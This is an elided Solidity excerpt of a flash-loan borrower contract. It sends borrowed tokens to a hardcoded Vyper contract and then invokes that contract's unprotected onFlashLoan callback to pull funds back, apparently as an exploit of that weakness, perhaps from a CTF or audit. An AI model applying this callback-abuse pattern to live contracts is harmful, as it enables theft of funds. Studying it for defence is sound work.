...
contract FlashBorrower is IERC3156FlashBorrower {
    ...
    function onFlashLoan(address user, address token, uint256 value, uint256 fee, bytes calldata data) external override {
        ...
        if (action == Action.NORMAL) {
            ...
            address target = 0x6d81246d56DAddABe891f7F82A39333781010f35;
            IERC20(token).transfer(target, flashBalance); //transfer the funds to the vyper contract
            IERC3156FlashBorrower(target).onFlashLoan(target, token, value, fee, data); //get the funds back by calling unsecured onFlashloan on the vyper 'tract'
